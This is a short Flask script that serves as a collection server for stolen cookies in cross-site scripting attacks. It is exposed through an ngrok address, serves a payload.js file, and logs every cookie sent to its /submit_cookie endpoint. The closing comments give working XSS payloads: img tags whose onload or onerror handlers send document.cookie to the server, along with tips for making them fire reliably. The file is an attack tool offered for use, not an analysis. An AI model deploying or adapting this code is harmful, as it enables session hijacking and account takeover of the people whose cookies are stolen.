from flask import Flask, request, send_file, render_template

app = Flask(__name__)
SERVER_ADDRESS = '4b050ff39860.ngrok.io'


@app.route('/')
def home():
    # return 'submit cookie at /submit_cookie?cookie=COOKIE'
    return render_template('index.html', server_address=SERVER_ADDRESS)


@app.route('/payload.js')
def send_payload():
    return render_template('payload.js', server_address=SERVER_ADDRESS)


@app.route('/submit_cookie')
def submit_cookie():
    """ /submit_cookie?cookie=COOKIE """
    cookie = request.args.get('cookie')
    print(f'{"="*50}> new cookie:', repr(cookie))
    return f'Got the cookie {cookie}'
    # return send_file('space.jpg')


if __name__ == "__main__":
    app.run(debug=True)


# can be used with images:
# <img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='http://127.0.0.1:5000/submit_cookie?cookie='+document.cookie>

# if an image is not returned, it will recursively trigger the onerror
# don't put spaces between the plus sign!!!
# <img src=x width=0 height=0 onerror=this.src='http://127.0.0.1:5000/submit_cookie?cookie='+document.cookie>
